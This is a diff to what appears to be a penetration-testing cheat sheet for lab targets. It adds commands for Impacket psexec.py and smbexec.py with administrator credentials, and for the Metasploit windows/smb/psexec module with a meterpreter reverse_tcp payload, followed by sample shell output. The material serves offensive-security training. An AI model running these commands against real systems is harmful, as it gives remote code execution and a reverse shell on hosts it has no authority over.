@@ -34,6 +34,10 @@ Info: Establishing connection to remote endpoint
 ### psexec.py
 psexec.py
 ```
+psexec.py MARVEL.local/administrator@example.htb
+```
+Example output:
+```
 $ psexec.py MARVEL.local/administrator@example.htb
 Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
 
@@ -53,6 +57,10 @@ C:\Windows\system32>
 
 ### msf psexec
 Metasploit psexec (windows/smb/psexec)
+```
+use exploit/windows/smb/psexec
+```
+Example output:
 ```
 msf6 exploit(windows/smb/psexec) > set payload payload/windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
@@ -103,6 +111,10 @@ meterpreter >
 ```
 ### smbexec.py
 smbexec.py
+```
+smbexec.py Administrator:'Password123'@example.local
+```
+Example output:
 ```
 root@attackdefense:~# smbexec.py Administrator:'Password123'@example.local
 Impacket v0.9.25.dev1+20220131.200424.badf09d - Copyright 2021 SecureAuth Corporation
